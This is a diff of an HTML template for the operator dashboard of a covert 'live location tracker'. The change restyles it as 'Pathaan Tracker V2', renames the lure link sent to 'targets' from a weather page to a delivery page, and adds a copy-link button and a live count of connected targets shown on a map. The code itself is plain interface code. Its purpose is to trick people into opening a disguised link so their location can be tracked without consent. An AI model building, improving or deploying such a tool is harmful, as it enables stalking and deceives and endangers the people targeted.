@@ -4,44 +4,171 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/1.0.2/css/bulma.min.css">
+    <title>Pathaan Tracker</title>
+
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/bulma/1.0.2/css/bulma.min.css">
+
+    <style>
+        body {
+            background: #05070f;
+            color: #00ff88;
+            min-height: 100vh;
+        }
+
+        .topbar {
+            background: #000;
+            border-bottom: 2px solid #00ff88;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .tracker-title {
+            color: #00ff88 !important;
+            margin-bottom: 5px !important;
+        }
+
+        .online {
+            color: #00ff88;
+            font-weight: bold;
+        }
+
+        .url-box {
+            background: #0b1220;
+            border: 1px solid #00ff88;
+            padding: 10px;
+            border-radius: 8px;
+            word-break: break-all;
+            color: white;
+        }
+
+        .target-card {
+            margin-top: 10px;
+            border: 1px solid #00ff88;
+            background: #0b1220 !important;
+            color: white !important;
+        }
+
+        .section-title {
+            color: #00ff88;
+            margin-top: 15px;
+        }
+
+        .copy-btn {
+            margin-top: 10px;
+        }
+
+        code {
+            color: #ff6b81;
+        }
+    </style>
 </head>
 
 <body>
-    <header class="has-background-black p-3 has-text-centered">
-        <h1 class="title is-4 mb-2">Live Location Tracker</h1>
-        <a href="#" class="is-block mb-2">Created by Shabaz Pathan</a>
-        <p class="is-block">Send to Target: <code>{{ global.remoteURL }}/weather</code></p>
-    </header>
 
-    <section id="tar-content" class="container is-widescreen p-2 is-flex is-flex-direction-column is-gap-1">
-        <h1 class="title is-5">Targets</h1>
+    <div class="topbar">
 
-        {{ for(value, key in TARGETS) }}
-        <a href="/map?id={{ key }}" class="button is-fullwidth">
-            {{ key }}
-        </a>
-        {{/}}
+        <h1 class="title tracker-title">
+            PATHAAN TRACKER V2
+        </h1>
+
+        <p class="online">
+            🟢 TRACKER ONLINE
+        </p>
+
+    </div>
+
+    <section class="container p-3">
+
+        <h2 class="title is-5 section-title">
+            Tracking Link
+        </h2>
+
+        <div class="url-box" id="tracking-url">
+            {{ global.remoteURL }}/delivery
+        </div>
+
+        <button class="button is-success is-fullwidth copy-btn"
+            onclick="copyLink()">
+            📋 Copy Tracking Link
+        </button>
+
+        <h2 class="title is-5 section-title">
+            Targets (<span id="target-count">0</span>)
+        </h2>
+
+        <div id="tar-content">
+
+            {{ for(value, key in TARGETS) }}
+
+            <a href="/map?id={{ key }}"
+                class="button is-fullwidth target-card">
+
+                {{ key }}
+
+            </a>
+
+            {{/}}
+
+        </div>
+
     </section>
 
     <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+
     <script>
-        const content = document.querySelector("#tar-content")
+
+        const content =
+            document.querySelector("#tar-content")
+
         const socket = io("", {
             secure: true,
             path: "/socket.io",
-            transports: ['websocket']
+            transports: ["websocket"]
         })
 
+        function updateCounter() {
+
+            const counter =
+                document.querySelector("#target-count")
+
+            counter.innerText =
+                document.querySelectorAll("#tar-content a").length
+        }
+
+        updateCounter()
+
         socket.on("user-connected", newId => {
-            const a = document.createElement('a')
-            a.href = `/map?id=${newId}`
-            a.className = "button is-fullwidth"
-            a.innerText = newId
+
+            const a =
+                document.createElement("a")
+
+            a.href =
+                `/map?id=${newId}`
+
+            a.className =
+                "button is-fullwidth target-card"
+
+            a.innerText =
+                newId
+
             content.appendChild(a)
+
+            updateCounter()
         })
+
+        function copyLink() {
+
+            const url =
+                document.querySelector("#tracking-url").innerText
+
+            navigator.clipboard.writeText(url)
+
+            alert("Tracking link copied")
+        }
+
     </script>
+
 </body>
 
 </html>
